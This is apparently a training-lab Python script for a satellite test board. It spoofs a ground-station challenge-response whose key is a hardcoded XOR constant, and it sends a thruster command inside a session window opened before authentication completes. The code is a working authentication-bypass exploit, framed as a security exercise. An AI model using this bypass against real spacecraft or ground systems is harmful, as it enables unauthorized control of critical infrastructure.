#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 04_gs_auth_spoofing_usb.py -- present as a station the spacecraft trusts.
#
# The gate's whole challenge-response is an exclusive-or with a constant that
# ships inside the ground software:
#
#     response = challenge ^ 0xC0DEFACE
#
# Anybody who has the console has the key. What the exchange proves is that
# the other end can do arithmetic, not that it is the station it claims to be.
#
# The second half is the ordering. A session gets opened so the handshake can
# proceed, and work is accepted inside that window, before identity has been
# established. Every step passes review; the defect is the order.
#
# Expected: a session opened from a console the board was never configured to
# trust, and a command accepted inside it.

import argparse
import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from flatsat import (FlatSat, GS_AUTH_KEY, TC_GS_ACCESS, TC_GS_STATUS,  # noqa: E402
                     TC_SET_THRUSTER, gs_response)


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default=None)
    ap.add_argument("--auth-key", type=lambda x: int(x, 0), default=GS_AUTH_KEY)
    ap.add_argument("--seq", type=int, default=1)
    ap.add_argument("--inside-window", action="store_true",
                    help="send a command between the open and the verify")
    ap.add_argument("--cleartext", action="store_true")
    args = ap.parse_args()

    with FlatSat(port=args.port, encrypt=not args.cleartext) as fsat:
        print("\n=== 1. gate status before ===")
        fsat.send(TC_GS_STATUS, b"", seq=args.seq, listen=1.2)

        print("\n=== 2. start the handshake. This opens a session ===")
        replies = fsat.send(TC_GS_ACCESS, b"\x00", seq=args.seq + 1, listen=1.5)

        challenge = None
        refusal = None
        for p in replies:
            body = fsat.plaintext(p)
            if p.apid == 0x09:
                refusal = body.split(b"\x00", 1)[0].decode("ascii", "replace").strip()
                print(f"[!] the board refused: {refusal}")
            # The challenge is the sixth through ninth octets, little endian.
            # In front of it sit the spacecraft id, the phase, the auth state
            # and two status bytes. Reading it from octets 1..4 big endian
            # answered a number the board had never issued, so the handshake
            # failed and the lab taught nothing: verified against hardware
            # 7 Nov 2026 against telemetrySPPTransmitGroundAccessStatus().
            if p.apid == TC_GS_ACCESS and len(body) >= 9:
                challenge = struct.unpack_from("<I", body, 5)[0]
                print(f"[*] challenge: 0x{challenge:08X}")
        # A challenge of zero is not a challenge. The gate checks range before
        # it checks identity (worker.cpp:466-482), so a board outside the
        # station's radius refuses at the earlier step and never issues one.
        # Guarding only on None let the lab answer a number nobody asked and
        # then print its closing line as though it had worked.
        if challenge is None or challenge == 0:
            if challenge == 0:
                print("[!] the challenge came back as zero, so no session was "
                      "opened.")
            else:
                print("[!] no challenge came back.")
            if refusal:
                print(f"[!] the board already told you why: {refusal}")
            print("\nThe gate checks three things in order: that the GPS fix "
                  "is usable, that you are inside the station's radius, and "
                  "only then that a session exists.")
            print("  GS GPS INVALID    no usable fix")
            print("  GS RANGE LOCK     outside the radius. The course build "
                  "starts in Tokyo and the station is in Sapporo, which is "
                  "about 830 km outside the 35 km it allows. Spoof the "
                  "position into range first, with lab 2.3, and come back")
            print("  GS AUTH REQUIRED  in range, no session. This lab's step")
            print("  ground-station mode off  nothing to open at all")
            return 1

        if args.inside_window:
            print("\n=== 2b. the window: a command before identity is established ===")
            fsat.send(TC_SET_THRUSTER, bytes([0, 0x40]), seq=args.seq + 2, listen=1.0)
            print("[*] If that was accepted, the ordering is the finding, not the key.")

        print("\n=== 3. answer it. One exclusive-or, with a constant we have ===")
        resp = gs_response(challenge, args.auth_key)
        print(f"[*] response: 0x{resp:08X}  (challenge ^ 0x{args.auth_key:08X})")
        fsat.send(TC_GS_ACCESS, b"\x01" + resp.to_bytes(4, "big"),
                  seq=args.seq + 3, listen=1.5)

        print("\n=== 4. gate status after ===")
        fsat.send(TC_GS_STATUS, b"", seq=args.seq + 4, listen=1.2)

    print("\nMark the exact step at which the correct order would have stopped "
          "you.\nThat, not the key, is the deliverable of this lab.")
    print("\nWhat the sensor should have shown: a critical command accepted "
          "before the ground-station exchange completed.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
